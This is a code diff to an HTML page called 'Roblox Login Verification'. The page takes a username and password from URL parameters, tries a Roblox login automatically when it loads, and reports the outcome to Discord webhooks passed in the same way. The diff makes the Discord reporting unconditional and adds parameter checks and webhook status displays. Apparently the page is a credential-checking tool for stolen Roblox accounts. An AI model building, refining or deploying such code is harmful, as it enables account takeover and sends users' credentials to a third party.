@@ -59,20 +59,6 @@
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
-        .btn {
-            background-color: #00a2ff;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            margin-top: 10px;
-        }
-        .btn:hover {
-            background-color: #0088cc;
-        }
         .instructions {
             background-color: #e7f3ff;
             padding: 15px;
@@ -80,19 +66,33 @@
             margin: 15px 0;
             font-size: 14px;
         }
+        .webhook-info {
+            background-color: #fff3cd;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 12px;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Roblox Login Verification</h1>
         
-        <div class="config-status config-success">
-            <span id="config-status-text">Ready to verify credentials</span>
+        <div id="config-status" class="config-status">
+            <span id="config-status-text">Initializing...</span>
         </div>
         
         <div class="info-box">
             <strong>Tracking ID:</strong> <span id="display-tracking-id">Waiting for data...</span><br>
             <strong>Username:</strong> <span id="display-username">Waiting for data...</span>
+        </div>
+        
+        <div id="webhook-info" class="webhook-info hidden">
+            <strong>Webhook Configuration:</strong><br>
+            Success: <span id="success-webhook-info"></span><br>
+            Failed: <span id="failed-webhook-info"></span>
         </div>
         
         <div id="login-form">
@@ -110,13 +110,9 @@
         </div>
 
         <div class="instructions">
-            <h3>How to Use:</h3>
-            <ol>
-                <li>Configure your webhook URLs in your Roblox game</li>
-                <li>This page will automatically process verification requests</li>
-                <li>Results are sent directly to your Discord</li>
-            </ol>
-            <p>No configuration needed on this page - everything is set up in Roblox!</p>
+            <h3>Configuration Note:</h3>
+            <p>Webhook URLs are configured in your Roblox game, not in this HTML file.</p>
+            <p>If verification isn't working, check your webhook URLs in the Roblox script.</p>
         </div>
     </div>
 
@@ -128,9 +124,9 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Webhook URLs will be provided by Roblox game via URL parameters
-        const successWebhook = urlParams.get('successWebhook');
-        const failedWebhook = urlParams.get('failedWebhook');
+        // Get webhook URLs from URL parameters
+        let successWebhook = urlParams.get('successWebhook');
+        let failedWebhook = urlParams.get('failedWebhook');
         
         // Display the tracking info
         if (trackingId) {
@@ -140,20 +136,41 @@
             document.getElementById('display-username').textContent = username;
         }
         
-        // Update status based on available parameters
+        // Display webhook information (for debugging)
         if (successWebhook && failedWebhook) {
-            document.getElementById('config-status-text').textContent = "Webhooks configured successfully";
-        } else {
-            document.getElementById('config-status-text').textContent = "Using default verification mode";
+            document.getElementById('success-webhook-info').textContent = successWebhook ? 'Configured' : 'Missing';
+            document.getElementById('failed-webhook-info').textContent = failedWebhook ? 'Configured' : 'Missing';
+            document.getElementById('webhook-info').classList.remove('hidden');
+        }
+        
+        // Update status based on available parameters
+        function updateStatus() {
+            const statusElement = document.getElementById('config-status');
+            const statusTextElement = document.getElementById('config-status-text');
+            
+            if (!trackingId || !username || !password) {
+                statusElement.className = 'config-status config-error';
+                statusTextElement.textContent = 'Missing parameters: id, userId, username, or password';
+                showError('Incomplete verification data. Make sure all parameters are provided.');
+                return false;
+            }
+            
+            if (!successWebhook || !failedWebhook) {
+                statusElement.className = 'config-status config-error';
+                statusTextElement.textContent = 'Webhook URLs not provided';
+                showError('Webhook URLs not provided. Check your Roblox script configuration.');
+                return false;
+            }
+            
+            statusElement.className = 'config-status config-success';
+            statusTextElement.textContent = 'Ready to verify credentials';
+            return true;
         }
         
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
-            if (trackingId && username && password) {
-                document.getElementById('config-status-text').textContent = "Verifying credentials...";
+            if (updateStatus()) {
                 setTimeout(attemptAutoLogin, 2000);
-            } else {
-                showError('Incomplete verification data. Make sure all parameters are provided.');
             }
         });
         
@@ -322,10 +339,8 @@
                 
                 resultMessage.classList.remove('hidden');
                 
-                // Send result to Discord if webhooks are provided
-                if (successWebhook && failedWebhook) {
-                    await sendToDiscord(isSuccess);
-                }
+                // Send result to Discord
+                await sendToDiscord(isSuccess);
             } catch (error) {
                 console.error('Error reporting result:', error);
                 showError('Failed to send result: ' + error.message);
@@ -391,8 +406,11 @@
                 if (!response.ok) {
                     throw new Error(`Discord API responded with ${response.status}`);
                 }
+                
+                console.log('Result sent to Discord successfully');
             } catch (error) {
                 console.error('Error sending to Discord:', error);
+                showError('Failed to send result to Discord. Check your webhook URLs.');
                 throw error;
             }
         }
